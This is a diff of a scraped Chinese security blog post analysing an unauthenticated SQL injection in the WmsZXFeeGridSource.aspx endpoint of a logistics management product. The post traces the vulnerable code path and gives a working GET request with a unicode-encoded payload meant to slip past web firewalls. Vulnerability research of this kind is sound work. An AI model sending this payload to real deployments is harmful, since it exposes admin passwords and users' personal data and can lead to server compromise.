@@ -7,23 +7,25 @@ asset_dir: assets/东胜物流软件-wmszxfeegridsource.aspx-sql注入漏洞
 # 东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/7/16 12:37
-- 1036浏览
+- 1037浏览
 - [0评论](#comment)
 - 45分钟阅读
 
 深入探索
 
-鉴权
+服务器
+
+软件
 
 身份验证
-
-安全
 
 ---
 
 # 漏洞简介
 
-东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WmsZXFeeGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WmsZXFeeGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+
+物流软件安全
 
 # 影响版本
 
@@ -35,11 +37,11 @@ asset_dir: assets/东胜物流软件-wmszxfeegridsource.aspx-sql注入漏洞
 
 深入探索
 
-漏洞扫描器
+Docker加速服务
 
-编程语言教程
+传输层安全性协议
 
-漏洞预警服务
+漏洞修复方案
 
 根据 WmsZXFeeGridSource.aspx 的代码引用 DSWeb.WMS\_ZX.WmsZXFeeGridSource ，在dll中找到它的逻辑实现
 
@@ -47,9 +49,21 @@ asset_dir: assets/东胜物流软件-wmszxfeegridsource.aspx-sql注入漏洞
 
 主要就是根据read参数的值来进行处理不同的分支逻辑
 
+SQL注入检测工具
+
+深入探索
+
+网络安全课程
+
+恶意软件分析工具
+
+网络安全会议
+
 [![东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞](images/img-002-ac7cdc76e9bf.webp)](https://image.mrxn.net/2a0fee06a5a54cdba1ed2988fe7a9a34.webp)
 
 当read=areaname时，进入DoAreaname方法
+
+代码安全审计
 
 ```
 private string DoAreaname(string strClientValue)
@@ -123,6 +137,8 @@ private string setnotlock()
 # 漏洞复现
 
 > 由于参数会被自动去除多余的空格等，同时areaname参数还会进行反转义操作，因此可以对payload进行unicode编码或者16进制编码在url编码等等操作，从而可能绕过waf
+>
+> 漏洞预警服务
 
 ```
 GET /WMS_ZX/WmsZXFeeGridSource.aspx?areaname=%20%20%20%20%5c%75%30%30%33%31%5c%75%30%30%32%37%5c%75%30%30%36%31%5c%75%30%30%36%65%5c%75%30%30%36%34%5c%75%30%30%32%30%5c%75%30%30%33%31%5c%75%30%30%33%63%5c%75%30%30%34%30%5c%75%30%30%34%30%5c%75%30%30%35%36%5c%75%30%30%34%35%5c%75%30%30%35%32%5c%75%30%30%35%33%5c%75%30%30%34%39%5c%75%30%30%34%66%5c%75%30%30%34%65%5c%75%30%30%32%64%5c%75%30%30%32%64%20%20%20%20&read=%20%20%20%20areaname%20%20%20%20 HTTP/1.1
